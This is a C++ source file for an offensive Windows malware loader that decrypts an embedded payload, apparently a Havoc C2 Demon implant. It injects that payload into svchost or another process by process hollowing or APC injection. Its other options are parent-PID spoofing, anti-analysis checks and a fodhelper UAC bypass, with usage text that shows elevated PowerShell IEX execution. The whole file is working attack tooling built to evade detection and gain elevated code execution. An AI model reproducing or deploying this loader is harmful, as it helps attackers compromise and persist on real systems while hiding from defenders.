#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <windows.h>
#include "easCipher42.hpp"
#include "crypto_funcs.hpp"
#include "process_hollower.hpp"
#include "process_injection.hpp"
#include "bypass_analysis.hpp"
#include "uac_bypass.hpp"
#include "demon.x64.h"

enum class InjectionMode { DEFAULT, HOLLOW, APC, UAC };

struct Config {
    bool verbose = false;
    bool anti_analysis = false;
    InjectionMode mode = InjectionMode::DEFAULT;
    DWORD target_pid = 0;
    DWORD spoof_ppid = 0;
    std::string target_process = "svchost.exe";
    std::string custom_command = "";
};

void print_usage(const char* prog) {
    std::cout << "\n=== AES Loader - Injection Modes ===\n\n";
    std::cout << "Usage: " << prog << " [MODE] [OPTIONS]\n\n";

    std::cout << "MODE (pick one, default is spawn svchost + APC):\n";
    std::cout << "  -m hollow           Process hollowing (create new process)\n";
    std::cout << "  -m apc              APC injection into existing process (requires -p)\n";
    std::cout << "  -m uac              UAC bypass via fodhelper\n\n";

    std::cout << "OPTIONS:\n";
    std::cout << "  -v, --verbose       Enable verbose debug output\n";
    std::cout << "  -a, --anti          Run anti-analysis checks\n";
    std::cout << "  -f, --file PATH     Target process to hollow (default: svchost.exe)\n";
    std::cout << "  -p, --pid PID       PID for APC injection (required for -m apc)\n";
    std::cout << "  --ppid PPID         Parent PID spoofing (works with hollow/apc spawn)\n";
    std::cout << "  -c, --cmd COMMAND   Custom command for UAC mode (instead of relaunching)\n";
    std::cout << "  -h, --help          Show this help\n\n";

    std::cout << "EXAMPLES:\n";
    std::cout << "  " << prog << "\n";
    std::cout << "    -> Spawn svchost + APC inject (default)\n\n";

    std::cout << "  " << prog << " -v\n";
    std::cout << "    -> Spawn svchost + APC inject + verbose\n\n";

    std::cout << "  " << prog << " -m hollow -v\n";
    std::cout << "    -> Hollow svchost + verbose\n\n";

    std::cout << "  " << prog << " -m hollow -f notepad.exe --ppid 500 -v\n";
    std::cout << "    -> Hollow notepad with PPID spoof (parent: 500) + verbose\n\n";

    std::cout << "  " << prog << " -m apc -p 1464 -v\n";
    std::cout << "    -> APC inject into existing PID 1464 + verbose\n\n";

    std::cout << "  " << prog << " -m uac -c \"powershell.exe -c 'IEX(...)'\"\n";
    std::cout << "    -> UAC bypass + execute custom command\n\n";
}

Config parse_args(int argc, char* argv[]) {
    Config cfg;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];

        if (arg == "-v" || arg == "--verbose") {
            cfg.verbose = true;
        }
        else if (arg == "-a" || arg == "--anti") {
            cfg.anti_analysis = true;
        }
        else if (arg == "-m" || arg == "--mode") {
            if (i + 1 < argc) {
                std::string mode = argv[++i];
                if (mode == "hollow") {
                    cfg.mode = InjectionMode::HOLLOW;
                } else if (mode == "apc") {
                    cfg.mode = InjectionMode::APC;
                } else if (mode == "uac") {
                    cfg.mode = InjectionMode::UAC;
                } else {
                    std::cerr << "[-] Unknown mode: " << mode << " (use: hollow, apc, uac)\n";
                    print_usage(argv[0]);
                    exit(1);
                }
            } else {
                std::cerr << "[-] -m/--mode requires a mode argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-f" || arg == "--file") {
            if (i + 1 < argc) {
                cfg.target_process = argv[++i];
            } else {
                std::cerr << "[-] -f/--file requires a path argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-p" || arg == "--pid") {
            if (i + 1 < argc) {
                try {
                    cfg.target_pid = std::stoul(argv[++i]);
                } catch (const std::invalid_argument& e) {
                    std::cerr << "[-] Invalid PID format\n";
                    print_usage(argv[0]);
                    exit(1);
                }
            } else {
                std::cerr << "[-] -p/--pid requires a PID argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "--ppid") {
            if (i + 1 < argc) {
                try {
                    cfg.spoof_ppid = std::stoul(argv[++i]);
                } catch (const std::invalid_argument& e) {
                    std::cerr << "[-] Invalid PPID format\n";
                    print_usage(argv[0]);
                    exit(1);
                }
            } else {
                std::cerr << "[-] --ppid requires a PID argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-c" || arg == "--cmd") {
            if (i + 1 < argc) {
                cfg.custom_command = argv[++i];
            } else {
                std::cerr << "[-] -c/--cmd requires a command argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-h" || arg == "--help") {
            print_usage(argv[0]);
            exit(0);
        }
        else {
            std::cerr << "[-] Unknown option: " << arg << "\n";
            print_usage(argv[0]);
            exit(1);
        }
    }

    // Validate mode-specific requirements
    if (cfg.mode == InjectionMode::APC && cfg.target_pid == 0) {
        std::cerr << "[-] Mode APC requires -p/--pid\n";
        print_usage(argv[0]);
        exit(1);
    }

    return cfg;
}

std::wstring ascii_to_wstring(const std::vector<uint8_t>& data) {
    std::string str;
    for (auto c : data) {
        if (c == '\0') break;
        str += (char)c;
    }

    int wide_size = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, nullptr, 0);
    std::wstring wstr(wide_size, 0);
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], wide_size);
    return wstr;
}

int main(int argc, char* argv[]) {
    Config cfg = parse_args(argc, argv);

    if (cfg.verbose) std::cout << "\n=== AES LOADER ===\n";

    // 1. Run anti-analysis checks if requested
    if (cfg.verbose || cfg.anti_analysis) {
        BypassAnalysis bypass(true);
        if (!bypass.run_checks()) {
            return -1;
        }
    }

    // 2. Initialize cipher & decrypt
    easCipher42 cipher;
    if (!cipher.Init(payload_enc, payload_enc_len)) {
        std::cout << "[-] Cipher Init FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] seed: " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
        std::cout << "[+] key: " << bytes_to_hex(cipher.GetKey(), 32) << "\n";
        std::cout << "[+] iv: " << bytes_to_hex(cipher.GetIV(), 16) << "\n\n";
    }

    // Decrypt default process name if not overridden
    if (cfg.target_process == "svchost.exe") {
        std::vector<uint8_t> default_proc_dec;
        if (!cipher.Decrypt(default_process_enc, default_process_enc_len, default_proc_dec)) {
            std::cout << "[-] Default process decrypt FAILED\n";
            return -1;
        }

        std::string default_proc_str;
        for (auto c : default_proc_dec) {
            if (c == '\0') break;
            default_proc_str += (char)c;
        }
        cfg.target_process = default_proc_str;
        if (cfg.verbose) std::cout << "[+] Default process: " << cfg.target_process << "\n";
    }

    // 3. Decrypt payload
    std::vector<uint8_t> payload;
    if (!cipher.Decrypt(cipher.GetPayloadEncCiphertext(), cipher.GetPayloadEncCiphertextLen(), payload)) {
        std::cout << "[-] Payload decrypt FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] Payload: " << payload.size() << " bytes\n";
        std::cout << "[+] Header: " << bytes_to_hex(payload.data(), 16) << "\n\n";
    }

    // 5. Execute injection method based on mode
    if (cfg.mode == InjectionMode::HOLLOW) {
        std::cout << "[*] Hollowing mode (target: " << cfg.target_process << ")...\n";
        if (cfg.spoof_ppid != 0) {
            std::cout << "[*] PPID spoofing enabled (target: " << cfg.spoof_ppid << ")...\n";
        }

        int wide_size = MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, nullptr, 0);
        std::wstring target_wide(wide_size, 0);
        MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, &target_wide[0], wide_size);

        ProcessHollower hollower(cfg.verbose, cfg.spoof_ppid);
        if (hollower.HollowProcess(target_wide.c_str(), payload)) {
            std::cout << "[+] SUCCESS\n";
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            return -1;
        }
    }
    else if (cfg.mode == InjectionMode::APC) {
        std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";

        ProcessInjection injector(cfg.verbose);
        if (injector.InjectViaAPC(cfg.target_pid, payload)) {
            std::cout << "[+] SUCCESS\n";
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            return -1;
        }
    }
    else if (cfg.mode == InjectionMode::UAC) {
        std::cout << "[*] UAC bypass mode...\n";

        std::string command_to_execute;
        if (!cfg.custom_command.empty()) {
            // Custom command provided: execute it elevated
            command_to_execute = cfg.custom_command;
            std::cout << "[*] Will execute custom command elevated: " << command_to_execute << "\n";
        } else {
            // No custom command: re-execute loader without -m uac flag
            char loader_path[MAX_PATH];
            GetModuleFileNameA(NULL, loader_path, MAX_PATH);

            command_to_execute = std::string("\"") + loader_path + "\"";

            // Reconstruct args without -m uac and -c flags for re-execution
            for (int i = 1; i < argc; i++) {
                std::string arg = argv[i];
                if (arg == "-m" || arg == "--mode") {
                    i++;  // Skip mode value
                    continue;
                }
                if (arg == "-c" || arg == "--cmd") {
                    i++;  // Skip command value
                    continue;
                }
                command_to_execute += " " + arg;
            }
            std::cout << "[*] Will re-execute elevated: " << command_to_execute << "\n";
        }

        UACBypass uac(command_to_execute, fodhelper_enc, fodhelper_enc_len, cipher, cfg.verbose);
        if (uac.execute_fodhelper()) {
            std::cout << "[+] UAC bypass executed\n";
            Sleep(2000);
            return 0;
        } else {
            std::cout << "[-] UAC bypass FAILED\n";
            return -1;
        }
    }
    else {  // DEFAULT: spawn svchost + APC inject
        std::cout << "[*] Default mode: spawning " << cfg.target_process << " + APC injection...\n";
        if (cfg.spoof_ppid != 0) {
            std::cout << "[*] PPID spoofing enabled (target: " << cfg.spoof_ppid << ")...\n";
        }

        // Convert target process to wide string
        int wide_size = MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, nullptr, 0);
        std::wstring target_wide(wide_size, 0);
        MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, &target_wide[0], wide_size);

        // Spawn target process suspended, then inject
        STARTUPINFOW si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(STARTUPINFOW);

        PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = nullptr;
        HANDLE hParentProcess = nullptr;

        if (cfg.spoof_ppid != 0) {
            SIZE_T attr_size = 0;
            if (!InitializeProcThreadAttributeList(nullptr, 1, 0, &attr_size)) {
                DWORD err = GetLastError();
                if (err != ERROR_INSUFFICIENT_BUFFER) {
                    std::cout << "[-] InitializeProcThreadAttributeList failed: " << err << "\n";
                    return -1;
                }
            }

            lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
            if (!lpAttributeList) {
                std::cout << "[-] HeapAlloc failed\n";
                return -1;
            }

            if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attr_size)) {
                std::cout << "[-] InitializeProcThreadAttributeList init failed\n";
                HeapFree(GetProcessHeap(), 0, lpAttributeList);
                return -1;
            }

            hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cfg.spoof_ppid);
            if (!hParentProcess) {
                std::cout << "[-] OpenProcess (PPID " << cfg.spoof_ppid << ") failed: " << GetLastError() << "\n";
                DeleteProcThreadAttributeList(lpAttributeList);
                HeapFree(GetProcessHeap(), 0, lpAttributeList);
                return -1;
            }

            if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                          &hParentProcess, sizeof(HANDLE), nullptr, nullptr)) {
                std::cout << "[-] UpdateProcThreadAttribute failed\n";
                CloseHandle(hParentProcess);
                DeleteProcThreadAttributeList(lpAttributeList);
                HeapFree(GetProcessHeap(), 0, lpAttributeList);
                return -1;
            }

            STARTUPINFOEXW si_ex = {};
            si_ex.StartupInfo.cb = sizeof(STARTUPINFOEXW);
            si_ex.lpAttributeList = lpAttributeList;

            BOOL result = CreateProcessW((LPWSTR)target_wide.c_str(), nullptr, nullptr, nullptr, TRUE,
                                        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                                        nullptr, nullptr, (LPSTARTUPINFOW)&si_ex, &pi);

            DeleteProcThreadAttributeList(lpAttributeList);
            HeapFree(GetProcessHeap(), 0, lpAttributeList);
            CloseHandle(hParentProcess);

            if (!result) {
                std::cout << "[-] CreateProcessW failed: " << GetLastError() << "\n";
                return -1;
            }
        } else {
            BOOL result = CreateProcessW((LPWSTR)target_wide.c_str(), nullptr, nullptr, nullptr, FALSE,
                                        CREATE_SUSPENDED,
                                        nullptr, nullptr, &si, &pi);
            if (!result) {
                std::cout << "[-] CreateProcessW failed: " << GetLastError() << "\n";
                return -1;
            }
        }

        if (cfg.verbose) std::cout << "[+] " << cfg.target_process << " spawned: PID " << pi.dwProcessId << "\n";
        CloseHandle(pi.hThread);

        // APC inject into spawned process
        ProcessInjection injector(cfg.verbose);
        if (injector.InjectViaAPC(pi.dwProcessId, payload)) {
            std::cout << "[+] SUCCESS\n";
            CloseHandle(pi.hProcess);
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            CloseHandle(pi.hProcess);
            return -1;
        }
    }

    return 0;
}
